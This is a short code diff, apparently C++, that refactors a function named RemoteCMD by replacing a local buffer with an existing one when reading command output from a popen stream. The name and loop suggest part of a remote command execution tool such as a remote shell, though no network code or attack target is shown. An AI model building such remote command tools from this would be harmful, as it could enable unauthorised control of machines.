@@ -98,7 +98,6 @@ void RemoteCMD()
 
     string data;
     FILE* stream;
-    char buf[1024];
 
     while (true)
     {
@@ -110,8 +109,8 @@ void RemoteCMD()
 
         if (stream) {
             while (!feof(stream))
-            if (fgets(buf, sizeof(buf), stream) != NULL) {
-                data.append(buf);
+            if (fgets(buffer, sizeof(buffer), stream) != NULL) {
+                data.append(buffer);
             
             } pclose(stream);
         
